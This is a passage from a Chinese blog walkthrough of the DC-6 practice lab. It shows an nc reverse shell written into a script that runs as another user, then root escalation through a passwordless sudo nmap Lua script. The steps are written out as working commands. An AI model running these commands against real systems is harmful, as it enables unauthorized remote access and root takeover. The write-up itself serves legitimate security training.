<p>因此，<code>backups.sh</code>中的解压缩命令被成功执行了！</p>
<p>那我们将其中的命令修改为反弹shell的指令，那它不就乖乖执行了，我们不久获得jens用户的登陆权限了吗！</p>
<h3 id="切换jens用户"><a href="#切换jens用户" class="headerlink" title="切换jens用户"></a>切换jens用户</h3><p>尝试使用vim进行修改，但发现不存在vim命令，可能是命令限制。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721652717673.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>那我们就是用<code>echo</code>命令进行覆盖式写入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;nc -e /bin/bash 192.168.204.128 6666&quot;</span> &gt; backups.sh<br></code></pre></td></tr></table></figure>

<p>cat一下查看效果：</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721652871391.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>新开一个终端进行端口监听：<code>nc -lvvp 6666</code><br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721652959342.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>成功！</p>
<p>查找flag文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721653106562.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>由于权限不足被拒绝了捏。</p>
<p>查看具有SUID权限的命令！</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721653199105.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>好像没啥有用的可提权命令，查看sudo配置信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721653212105.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ok！获知<code>nmap</code>可以用来提权。</p>
<blockquote>
<p> (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;nmap</p>
</blockquote>
<h3 id="nmap提权"><a href="#nmap提权" class="headerlink" title="nmap提权"></a>nmap提权</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a1_pha/article/details/135448072">nmap提权</a></p>
<p>在jens用户目录下逐一执行以下命令：（命令的详细含义参考上面的链接）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span>)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;os.execute(&quot;/bin/sh&quot;)&#x27;</span> &gt; <span class="hljs-variable">$TF</span><br>sudo nmap --script=<span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721653886328.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ok！提权成功！</p>
<p>寻找flag文件！</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721654002112.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ok！至此，全部操作结束。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>namp提权方法：</li>
</ul>
<blockquote>
<p>TF&#x3D;$(mktemp)<br>echo ‘os.execute(“&#x2F;bin&#x2F;sh”)’ &gt; $TF<br>sudo nmap –script&#x3D;$TF</p>
</blockquote>
<ul>
<li><p>重定向修改：本地hosts文件添加“IP	域名”绑定项。</p>
</li>
<li><p>爆破真的是一项大工程，可能由于字典很大没法进行，所以爆破不出来可能只是字典的原因罢了</p>
</li>
<li><p>提权方法千千万，善于利用信息才好办，多找信息，多找方法，最终估计还得命令提权</p>
</li>
<li><p>后台系统找命令执行很重要，怎么拿到一个webshell确实很重要</p>
</li>
<li><p>可以通过别的用户权限的可执行文件去切换用户或者提权（我们最后就是通过jens用户提权成功的）</p>
</li>
</ul>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>DC-6</div>
      <div>https://haoisbinlove.github.io/2024/07/30/DC-6/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Sweety</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年7月30日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/07/30/DC-7/" title="DC-7">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">DC-7</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/07/30/DC-5/" title="DC-5">
                        <span class="hidden-mobile">DC-5</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
